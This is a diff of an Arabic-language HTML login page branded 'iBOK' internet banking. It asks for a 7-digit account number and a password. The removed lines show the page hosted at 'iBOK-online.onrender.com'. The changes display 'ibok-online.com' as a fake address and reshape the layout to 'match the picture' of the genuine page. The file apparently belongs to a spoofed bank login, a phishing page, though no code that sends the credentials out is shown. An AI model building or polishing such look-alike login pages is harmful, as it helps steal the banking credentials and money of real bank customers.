@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - iBOK</title>
+    <title>iBOK - تسجيل الدخول</title>
     <style>
         * {
             margin: 0;
@@ -26,93 +26,91 @@
             max-width: 400px;
             width: 100%;
             padding: 30px 25px 25px;
-            border-radius: 24px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
+            border-radius: 28px;
+            box-shadow: 0 15px 45px rgba(0, 20, 40, 0.15);
             text-align: center;
         }
 
-        /* الرابط العلوي */
-        .url-bar {
-            font-size: 13px;
-            color: #1a73e8;
-            background: #f0f5ff;
-            padding: 8px 14px;
-            border-radius: 20px;
-            display: inline-block;
-            margin-bottom: 16px;
-            font-weight: 500;
+        /* الرابط العلوي - مطابق للصورة */
+        .site-url {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1a3a6b;
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
         }
 
-        .sub-url {
+        .service-ar {
+            font-size: 14px;
+            color: #444;
+            font-weight: 500;
+            margin-top: 2px;
+        }
+
+        .service-en {
             font-size: 13px;
-            color: #555;
-            margin-top: -6px;
+            color: #777;
+            font-weight: 400;
+            margin-top: -2px;
             margin-bottom: 18px;
         }
 
-        .sub-url span {
-            color: #1a73e8;
-            font-weight: 500;
-        }
-
-        /* شعار iBOK */
-        .logo {
-            font-size: 36px;
-            font-weight: 800;
-            color: #003366;
-            letter-spacing: 1px;
-        }
-
-        .logo span {
-            color: #c9a84b;
-        }
-
-        .sub-logo {
-            font-size: 14px;
-            color: #666;
-            margin-top: 2px;
-            font-weight: 500;
-        }
-
-        .welcome {
-            font-size: 20px;
+        /* النص الترحيبي الطويل كما في الصورة */
+        .welcome-text {
+            font-size: 18px;
             font-weight: 600;
             color: #003366;
-            margin-top: 22px;
-            margin-bottom: 20px;
-        }
-
-        /* خط فاصل ذهبي */
-        .divider {
-            width: 50px;
-            height: 3px;
-            background: #c9a84b;
-            margin: 0 auto 24px;
-            border-radius: 10px;
-        }
-
-        .form-group {
-            text-align: right;
+            line-height: 1.6;
             margin-bottom: 18px;
         }
 
-        .form-group label {
+        /* عنوان تسجيل الدخول */
+        .main-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: #003366;
+            margin-bottom: 2px;
+        }
+
+        .sub-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a3a6b;
+            margin-bottom: 22px;
+        }
+
+        /* الحقول */
+        .form-group {
+            text-align: right;
+            margin-bottom: 16px;
+        }
+
+        .form-group .field-label {
             display: block;
             font-size: 16px;
             font-weight: 700;
             color: #003366;
+            margin-bottom: 2px;
+        }
+
+        .form-group .field-hint {
+            display: block;
+            font-size: 14px;
+            color: #555;
             margin-bottom: 6px;
+            font-weight: 400;
         }
 
         .form-group input {
             width: 100%;
-            padding: 13px 16px;
+            padding: 12px 16px;
             font-size: 15px;
             border: 2px solid #dce3ed;
             border-radius: 14px;
             background: #f8faff;
             transition: 0.3s;
             outline: none;
+            text-align: right;
         }
 
         .form-group input:focus {
@@ -121,39 +119,36 @@
             box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.08);
         }
 
-        .form-group .example {
-            font-size: 13px;
-            color: #888;
-            margin-top: 4px;
-            text-align: right;
-        }
-
+        /* رابط نسبت كلمة المرور (بدون رمز) */
         .forgot-link {
             display: block;
-            text-align: left;
-            font-size: 14px;
+            text-align: right;
+            font-size: 15px;
             color: #003366;
             text-decoration: none;
-            font-weight: 500;
-            margin: 2px 0 20px;
+            font-weight: 600;
+            margin: 6px 0 22px;
+            cursor: pointer;
         }
 
         .forgot-link:hover {
             text-decoration: underline;
         }
 
+        /* زر تسجيل الدخول */
         .btn-login {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             background: #003366;
             color: #fff;
-            font-size: 18px;
+            font-size: 19px;
             font-weight: 700;
             border: none;
             border-radius: 30px;
             cursor: pointer;
             transition: 0.3s;
-            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.3);
+            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.25);
+            letter-spacing: 0.5px;
         }
 
         .btn-login:hover {
@@ -161,9 +156,11 @@
             transform: scale(1.01);
         }
 
+        /* التذييل - 2025 | iBOK */
         .footer {
-            margin-top: 24px;
-            font-size: 13px;
+            margin-top: 26px;
+            font-size: 15px;
+            font-weight: 600;
             color: #888;
             border-top: 1px solid #eef2f7;
             padding-top: 18px;
@@ -171,21 +168,23 @@
 
         .footer strong {
             color: #003366;
+            font-weight: 800;
         }
 
-        .footer .copy {
-            display: block;
-            margin-top: 3px;
-            color: #aaa;
-            font-size: 12px;
+        .footer .pipe {
+            color: #c9a84b;
+            margin: 0 4px;
         }
 
         @media (max-width: 480px) {
             .card {
-                padding: 22px 16px;
+                padding: 20px 16px;
             }
-            .logo {
-                font-size: 30px;
+            .main-title {
+                font-size: 22px;
+            }
+            .welcome-text {
+                font-size: 16px;
             }
         }
     </style>
@@ -194,43 +193,48 @@
 
     <div class="card">
 
-        <!-- رابط الموقع (كما في الصورة الثانية) -->
-        <div class="url-bar">🔗 iBOK-online.onrender.com</div>
-        <div class="sub-url">
-            الخدمات المصرفية عبر الإنترنت<br>
-            <span>ibok-online.com</span>
-        </div>
+        <!-- النصوص العلوية كما في الصورة -->
+        <div class="site-url">ibok-online.com</div>
+        <div class="service-ar">الخدمات المصرفية عبر الإنترنت</div>
+        <div class="service-en">Internet Banking Services</div>
 
-        <!-- شعار iBOK -->
-        <div class="logo">i<span>BOK</span></div>
-        <div class="sub-logo">Internet Banking Services</div>
+        <!-- الترحيب الطويل -->
+        <div class="welcome-text">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</div>
 
-        <!-- ترحيب -->
-        <div class="welcome">مرحباً بكم في خدمة iBOK</div>
-        <div class="divider"></div>
+        <!-- العناوين -->
+        <div class="main-title"># تسجيل الدخول</div>
+        <div class="sub-title">## الرجاء إدخال البيانات</div>
 
-        <!-- نموذج -->
+        <!-- نموذج الدخول -->
         <form action="#" method="POST">
+
+            <!-- حقل رقم الحساب -->
             <div class="form-group">
-                <label>رقم الحساب</label>
-                <input type="text" placeholder="أدخل رقم الحساب المكون من 7 أرقام" maxlength="7">
-                <div class="example">مثال: 1234567</div>
+                <span class="field-label">رقم الحساب:</span>
+                <span class="field-hint">أدخل رقم الحساب المكون من 7 أرقام</span>
+                <input type="text" placeholder="مثال: 1234567" maxlength="7" inputmode="numeric">
             </div>
 
+            <!-- حقل كلمة المرور -->
             <div class="form-group">
-                <label>كلمة المرور</label>
-                <input type="password" placeholder="أدخل كلمة المرور">
+                <span class="field-label">كلمة المرور:</span>
+                <span class="field-hint">أدخل كلمة المرور</span>
+                <input type="password" placeholder="••••••••">
             </div>
 
-            <a href="#" class="forgot-link">🔑 نسبت كلمة المرور</a>
+            <!-- نسبت كلمة المرور (بدون أيقونة، يمين) -->
+            <a href="#" class="forgot-link">نسبت كلمة المرور</a>
 
+            <!-- زر تسجيل الدخول -->
             <button type="submit" class="btn-login">تسجيل الدخول</button>
+
         </form>
 
-        <!-- تذييل -->
+        <!-- التذييل 2025 | iBOK -->
         <div class="footer">
-            <strong>iBOK</strong> | 2025
-            <span class="copy">جميع الحقوق محفوظة ©</span>
+            <span>2025</span>
+            <span class="pipe">|</span>
+            <strong>iBOK</strong>
         </div>
 
     </div>
